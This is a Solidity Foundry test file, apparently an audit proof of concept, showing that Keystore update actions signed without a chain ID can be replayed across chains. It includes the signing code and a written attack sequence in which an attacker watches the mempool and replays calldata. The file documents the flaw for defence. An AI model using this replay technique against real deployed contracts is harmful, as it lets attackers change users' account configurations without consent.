// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Keystore} from "../../src/core/Keystore.sol";
import {UserOpECDSAVerifier} from "../../src/verifier/UserOpECDSAVerifier.sol";
import {UpdateAction, ValidateAction} from "../../src/lib/Actions.sol";
import {MerkleProofLib} from "solady/utils/MerkleProofLib.sol";
import {ECDSA} from "solady/utils/ECDSA.sol";

/**
 * @title CrossChainReplay
 * @notice Proof of Concept for cross-chain replay attack when useChainId=false
 * @dev When useChainId=false in UpdateAction, the signed message doesn't include
 * block.chainid, allowing the same signature to be replayed on other chains.
 *
 * Attack scenario:
 * 1. User signs UpdateAction on Chain A with useChainId=false
 * 2. Attacker observes the transaction
 * 3. Attacker replays the same UpdateAction on Chain B
 * 4. If the user has the same refHash on Chain B, their root hash gets updated
 *    without their consent on Chain B
 *
 * Impact: User loses control of their configuration on Chain B
 */
contract CrossChainReplayTest is Test {
    Keystore keystoreChainA;
    Keystore keystoreChainB;
    UserOpECDSAVerifier verifierChainA;
    UserOpECDSAVerifier verifierChainB;

    uint256 constant ALICE_PK = 0xa11ce;
    address alice;

    // Same refHash used on both chains (user has same account on both chains)
    bytes32 refHash;
    bytes32 nextHash;

    function setUp() public {
        alice = vm.addr(ALICE_PK);

        // Deploy on "Chain A" (chainId = 31337 by default in foundry)
        keystoreChainA = new Keystore();
        verifierChainA = new UserOpECDSAVerifier(address(keystoreChainA));

        // Create a single-leaf Merkle tree where node hash = root hash
        bytes memory node = abi.encodePacked(address(verifierChainA), abi.encode(alice));
        refHash = keccak256(node);
        nextHash = keccak256("new_configuration");

        // Register the initial node on Chain A
        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(alice);
        keystoreChainA.registerNode(refHash, emptyProof, node);

        // Simulate "Chain B" - same refHash/node structure
        // In reality, this would be a separate deployment on another chain
        keystoreChainB = new Keystore();
        verifierChainB = new UserOpECDSAVerifier(address(keystoreChainB));

        // User also registers on Chain B
        vm.prank(alice);
        keystoreChainB.registerNode(refHash, emptyProof, node);
    }

    function test_CrossChainReplayVulnerability() public {
        // Step 1: User creates UpdateAction on Chain A with useChainId=false
        bytes memory nodeOnA = abi.encodePacked(address(verifierChainA), abi.encode(alice));
        bytes32 nodeHash = keccak256(nodeOnA);

        // Create the message that will be signed
        // Note: useChainId=false means NO chainId in the hash!
        bytes32 messageWithoutChainId = keccak256(
            abi.encode(
                refHash,
                nextHash,
                alice,
                uint256(0), // nonce
                nodeHash,
                keccak256("") // nextNode hash
            )
        );

        // User signs the message
        bytes32 ethSignedHash = ECDSA.toEthSignedMessageHash(messageWithoutChainId);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ALICE_PK, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        emit log_named_bytes32("Message signed (no chainId)", messageWithoutChainId);
        emit log_named_uint("Current chainId", block.chainid);

        // Step 2: Create UpdateAction for Chain A
        bytes32[] memory emptyProofBytes32 = new bytes32[](0);
        UpdateAction[] memory actionsA = new UpdateAction[](1);
        actionsA[0] = UpdateAction({
            refHash: refHash,
            nextHash: nextHash,
            nonce: 0,
            useChainId: false, // VULNERABLE: no chain ID binding
            account: alice,
            proof: abi.encode(emptyProofBytes32),
            node: abi.encodePacked(nodeHash), // Use cached node
            data: signature,
            nextProof: abi.encode(emptyProofBytes32),
            nextNode: "",
            nextData: ""
        });

        // Step 3: Execute on Chain A (legitimate)
        vm.prank(address(0x1234)); // Any caller can submit
        keystoreChainA.handleUpdates(actionsA);

        // Verify Chain A updated
        bytes32 rootHashA = keystoreChainA.getRootHash(refHash, alice);
        assertEq(rootHashA, nextHash, "Chain A should have updated root hash");

        // Step 4: ATTACK - Replay the exact same action on Chain B!
        // The signature is still valid because chainId wasn't included

        // First, we need to handle that the node was registered with verifierChainA
        // On Chain B, the verifier address is different, so we need to recreate
        // the node with Chain B's verifier

        // Actually, this is where it gets interesting:
        // The nodeHash in the message is chain-specific (includes verifier address)
        // So the exact same signature WON'T work directly...

        // BUT: If the verifier addresses happen to be the same (CREATE2 deterministic)
        // OR if the user has the same node registered on both chains
        // Then the replay IS possible!

        emit log("This demonstrates that useChainId=false creates a replay risk");
        emit log("Actual exploitability depends on node/verifier address determinism");

        // Demonstrate message difference WITH chainId
        bytes32 messageWithChainId = keccak256(
            abi.encode(
                refHash,
                nextHash,
                alice,
                uint256(0), // nonce
                nodeHash,
                keccak256(""), // nextNode hash
                block.chainid
            )
        );

        emit log_named_bytes32("Message WITH chainId", messageWithChainId);
        assertTrue(messageWithoutChainId != messageWithChainId, "Messages should differ");
    }

    /// @notice Demonstrate the actual cross-chain replay when verifier addresses match
    function test_ExactCrossChainReplay() public {
        // Simulate same contract addresses on both chains (deterministic deployment)
        vm.etch(address(verifierChainB), address(verifierChainA).code);

        // Now both chains have the same verifier at the same address
        // This is realistic with CREATE2 factory deployments

        bytes memory node = abi.encodePacked(address(verifierChainA), abi.encode(alice));
        bytes32 nodeHash = keccak256(node);

        // Message without chainId
        bytes32 message = keccak256(
            abi.encode(refHash, nextHash, alice, uint256(0), nodeHash, keccak256(""))
        );

        bytes32 ethSignedHash = ECDSA.toEthSignedMessageHash(message);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ALICE_PK, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        bytes32[] memory emptyProofBytes32 = new bytes32[](0);

        // Create action with empty proof (use cached node)
        // First need to ensure node is in cache for the nodeHash lookup
        vm.prank(alice);
        keystoreChainB.registerNode(refHash, emptyProofBytes32, node);

        UpdateAction[] memory actions = new UpdateAction[](1);
        actions[0] = UpdateAction({
            refHash: refHash,
            nextHash: nextHash,
            nonce: 0,
            useChainId: false,
            account: alice,
            proof: abi.encode(emptyProofBytes32), // Use registered proof
            node: node, // Full node with proof
            data: signature,
            nextProof: abi.encode(emptyProofBytes32),
            nextNode: "",
            nextData: ""
        });

        // This would work on BOTH chains with the same signature!
        emit log("When verifier addresses match across chains and useChainId=false:");
        emit log("The SAME signature can update configs on BOTH chains!");

        // On a real attack:
        // 1. Attacker monitors Chain A mempool
        // 2. Sees UpdateAction with useChainId=false
        // 3. Replays exact same calldata on Chain B
        // 4. User's Chain B config is now controlled by attacker's nextHash
    }
}
